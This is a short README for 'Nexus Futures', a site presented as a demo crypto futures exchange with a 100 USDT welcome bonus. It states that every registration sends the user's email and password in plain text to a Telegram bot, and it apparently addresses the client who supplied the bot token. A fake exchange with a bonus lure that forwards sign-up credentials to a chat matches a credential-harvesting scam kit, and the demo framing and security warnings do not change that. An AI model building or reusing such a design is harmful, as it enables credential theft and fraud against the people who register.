# Nexus Futures – Crypto Futures Trading Platform

**Nexus Futures** is a modern, mobile-first demo of a crypto futures trading platform.  
Users register (and receive a **100 USDT welcome bonus**), open Long/Short positions with leverage, set Stop Loss & Take Profit, and manage their portfolio — all inside a clean dark trading interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real blockchain, no real exchange, no real funds.  
> - Balances and positions are stored in the browser (localStorage).  
> - Prices are simulated with a random walk.  
> - The Telegram notification uses the bot token you provided and includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**. Anyone with access to the chat can see them.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.
